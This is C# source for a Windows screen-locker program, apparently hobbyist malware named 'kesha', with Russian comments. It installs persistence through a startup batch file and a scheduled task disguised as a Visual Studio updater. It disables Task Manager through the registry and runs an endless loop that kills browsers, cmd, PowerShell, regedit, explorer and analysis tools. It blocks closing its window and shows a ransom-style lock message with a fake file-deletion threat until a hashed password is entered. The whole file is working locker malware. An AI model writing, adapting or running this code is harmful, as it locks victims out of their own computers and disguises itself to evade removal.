using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace kesha.vir
{
    public partial class Form1 : Form
    {
        private Thread myThread;
        private bool ActChecker = true;
        private TaskDefinition td;
        private string str;
        private int i;
        
        public Form1()
        {
            InitializeComponent();

            try
            {
                Enabling_blocking();
            }
            catch { }
            
        }
        private void Disabling_blocking()
        {


            //ВЫХОДИМ ИЗ БЕСКОНЕЧНОГО ЦИКЛА

            ActChecker = false;

            //УДАЛЯЕМ ФАЙЛ ИЗ AUTORUN || C:\Windows\kesha.txt || П.ЗАДАЧ

            try
            {
                System.IO.File.Delete(@Environment.GetEnvironmentVariable("userprofile") + @"\AppData\Roaming\Microsoft\Wi" +
                @"ndows\Start Menu\Programs\Startup\-virus-.bat");//autorun
            }
            catch { }

            try 
            {
                System.IO.File.Delete(@"C:\Windows\kesha.txt");
            }
            catch { }

            try
            {
                using (TaskService ts = new TaskService())
                {
                    ts.RootFolder.DeleteTask("MicrosoftVSUpdater!");
                }
            }
            catch { }
            

            //ВКЛЮЧАЕМ НАШ TASKMGR

            try
            {
                string cmdrdddd = @"REG add HKCU\SOFTWARE\Microsoft\Windows\Curren" +
                @"tVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f";

                var cmdersccc = new ProcessStartInfo()
                {
                    UseShellExecute = true,
                    WorkingDirectory = @"C:\Windows\System32",
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = "/c " + cmdrdddd,
                    WindowStyle = ProcessWindowStyle.Hidden//vanish
                };

                Process.Start(cmdersccc);
            }
            catch { }

            //ВКЛЮЧАЕМ НАШ EXPLORER
            
            try
            {
                string cm = @"C:\Windows\explorer.exe";
                var startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd";
                startInfo.Arguments = "/c " + cm;
                startInfo.Verb = "runas"; // run elevated
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                var proc = Process.Start(startInfo);
            }
            catch { }

            //НА ВСЯКИЙ СЛУЧ. ОТКРЫВАЕМ CMD

            try
            {
                string cm = @"cmd";
                var startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd";
                startInfo.Arguments = "/c " + cm;
                startInfo.Verb = "runas"; // run elevated
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                var proc = Process.Start(startInfo);
            }
            catch { }

            //УБИВАЕМ ПРОЦЕСС НАШЕЙ ПРОГРАММЫ

            string exe_name = System.IO.Path.GetFileName(Application.ExecutablePath);

            CmdKiller(exe_name);
        }

        private void Enabling_blocking()
        {
            //ФЕЙК ФАЙЛ В АВТОЗАГРУЗКЕ

            try
            {
                string filePath = (@Environment.GetEnvironmentVariable("userprofile") + @"\AppData\Roaming\Microsoft\Wi" +
                @"ndows\Start Menu\Programs\Startup\-virus-.bat");

                string st = "."+Application.ExecutablePath + "\n" + @"" + "\n" +
                    @"░░░██╗░░██╗███████╗░██████╗██╗░░██╗░█████╗░" +      "\n" +
                    @"░░░██║░██╔╝██╔════╝██╔════╝██║░░██║██╔══██╗" +      "\n" +
                    @"░░░█████═╝░█████╗░░╚█████╗░███████║███████║" +      "\n" +
                    @"░░░██╔═██╗░██╔══╝░░░╚═══██╗██╔══██║██╔══██║" +      "\n" +
                    @"██╗██║░╚██╗███████╗██████╔╝██║░░██║██║░░██║" +      "\n" +
                    @"╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝" +      "\n" ;

                using (FileStream fileStream = File.Open(filePath, FileMode.Create))
                {
                    using (StreamWriter output = new StreamWriter(fileStream))
                    {
                        output.Write(st);
                    }
                }
            }
            catch { }

            //CОЗДАНИЕ ФАЙЛ В П.ЗАДАЧ

            try
            {
                using (var taskService = new TaskService())
                {
                    TaskDefinition td = taskService.NewTask();
                    td.RegistrationInfo.Description = "Update Microsoft Visual Studeo";
                    td.Principal.LogonType = TaskLogonType.InteractiveToken;
                    td.Triggers.Add(new LogonTrigger());
                    td.Actions.Add(new ExecAction(Application.ExecutablePath));
                    taskService.RootFolder.RegisterTaskDefinition("MicrosoftVSUpdater!", td);
                }
            }
            catch { }

            //ОТКЛЮЧЕНИЕ ДИСПЕТЧ. ЗАДАЧ

            try
            {
                string cmdrdddd = @"REG add HKCU\SOFTWARE\Microsoft\Windows\Curren" +
                    @"tVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f";

                var cmdersccc = new ProcessStartInfo()
                {
                    UseShellExecute = true,
                    WorkingDirectory = @"C:\Windows\System32",
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = "/c " + cmdrdddd,
                    WindowStyle = ProcessWindowStyle.Hidden//vanish
                };

                Process.Start(cmdersccc);
            }
            catch { }

            //СОЗДАНИЕ БЕСК ПОТОКА [checker]

            try
            {
                try
                {
                    myThread = new Thread(new ThreadStart(Multithreaded_checker));
                    myThread.Start();
                }
                catch { }
            }
            catch { }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            try 
            {
                str = "------------------OOPS! I've blocked your system----------------";
                if (label1.Text != "")
                    timer1.Start();
                else
                    timer2.Start();
            }
            catch{}
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //запрет закрытия окна
            try
            {
                if (e.CloseReason == CloseReason.UserClosing)
                {
                    e.Cancel = true;
                }
            }
            catch { }
        }
        private void Multithreaded_checker()
        {
            //бесконечный поток с проверкой приложений
            while (true)
            {
                if (ActChecker == true)
                {
                    try
                    {
                        Process[] q = Process.GetProcessesByName("Taskmgr");
                        if (q.Length > 0)
                        {
                            string CM = @"taskkill /IM Taskmgr.exe /F";
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = "cmd";
                            startInfo.Arguments = "/c " + CM;
                            startInfo.Verb = "runas"; // run elevated
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(startInfo);
                        }
                    }
                    catch { }
                    

                    Process[] a = Process.GetProcessesByName("Chrome");
                    if (a.Length > 0)
                    {
                        CmdKiller("Chrome.exe");
                    }

                    Process[] z = Process.GetProcessesByName("Yandex");
                    if (z.Length > 0)
                    {
                        CmdKiller("Yandex.exe");
                    }

                    Process[] w = Process.GetProcessesByName("FireFox");
                    if (w.Length > 0)
                    {
                        CmdKiller("FireFox.exe");
                    }

                    Process[] s = Process.GetProcessesByName("opera");
                    if (s.Length > 0)
                    {
                        CmdKiller("opera.exe");
                    }

                    Process[] ss = Process.GetProcessesByName("notepad");
                    if (ss.Length > 0)
                    {
                        CmdKiller("notepad.exe");
                    }

                    try
                    {
                        Process[] x = Process.GetProcessesByName("regedit");
                        if (x.Length > 0)
                        {
                            string CM = @"taskkill /IM regedit.exe /F";
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = "cmd";
                            startInfo.Arguments = "/c " + CM;
                            startInfo.Verb = "runas"; // run elevated
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(startInfo);
                        }
                    }
                    catch { }
                    

                    Process[] e = Process.GetProcessesByName("powershell");
                    if (e.Length > 0)
                    {
                        CmdKiller("powershell.exe");
                    }

                    Process[] d = Process.GetProcessesByName("perfmon");
                    if (d.Length > 0)
                    {
                        CmdKiller("perfmon.exe");
                    }

                    Process[] c = Process.GetProcessesByName("SystemSettings");
                    if (c.Length > 0)
                    {
                        CmdKiller("SystemSettings.exe");
                    }

                    Process[] r = Process.GetProcessesByName("cmd");
                    if (r.Length > 0)
                    {
                        CmdKiller("cmd.exe");
                    }

                    Process[] f = Process.GetProcessesByName("ProcessHacker");
                    if (f.Length > 0)
                    {
                        CmdKiller("ProcessHacker.exe");
                    }

                    Process[] v = Process.GetProcessesByName("iexplore");
                    if (v.Length > 0)
                    {
                        CmdKiller("iexplore.exe");
                    }

                    Process[] t = Process.GetProcessesByName("mmc.exe");
                    if (t.Length > 0)
                    {
                        string CM = @"taskkill /IM mmc.exe /F";
                        ProcessStartInfo startInfo = new ProcessStartInfo();
                        startInfo.FileName = "cmd";
                        startInfo.Arguments = "/c " + CM;
                        startInfo.Verb = "runas"; // run elevated
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(startInfo);
                    }

                    Process[] g = Process.GetProcessesByName("explorer");
                    if (g.Length > 0)
                    {
                        CmdKiller("explorer.exe");
                    }

                    System.Threading.Thread.Sleep(100);
                   
                }
                else {break;}
            }
        }
        private void Timer1_Tick_1(object sender, EventArgs e)
        {//там просто красиво
            try
            {
                label1.Text = label1.Text.Remove(label1.Text.Length - 1);
                if (label1.Text.Length == 0)
                {
                    timer1.Stop();
                    timer2.Start();
                }
            }
            catch { }
        }
        private void Timer2_Tick(object sender, EventArgs e)
        {//эта тоже очень красиво
            try
            {
                label1.Text += str[i++];
                if (i == str.Length)
                {
                    str = "--------------------------------SORRY-------------------------------------";
                    timer1.Stop();

                    timer2.Stop();
                    label1.ForeColor = Color.Red;
                    i = 0;
                }
            }
            catch { }
        }
        private string CreateMD5(string password)
        {//мд5 имба вещьь
            byte[] encodedPassword = new UTF8Encoding().GetBytes(password);
            byte[] hash = ((HashAlgorithm)CryptoConfig.CreateFromName("MD5")).ComputeHash(encodedPassword);
            return BitConverter.ToString(hash).Replace("-", string.Empty).ToLower();
        }
        private void CmdKiller(string NameProc)
        {//cmd киллер связанный с беск потоком
            try
            {
                string CM = @"taskkill /IM " + NameProc + " /F";
                var cmderscww = new ProcessStartInfo()
                {
                    UseShellExecute = true,
                    WorkingDirectory = @"C:\Windows\System32",
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = "/c " + CM,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(cmderscww);
            }
            catch { }
        }
        private void EnterPass_Click(object sender, EventArgs e)
        {//проверка паролей
            if (CreateMD5(key.Text) == "3f363cbc1e74c3ff27c8cd2b8911ff2e")
            {
                Disabling_blocking(); //kesha
            }
            else
            {
                key.Text = "- удалено 100 файлов -";
            }
        }
    }
}
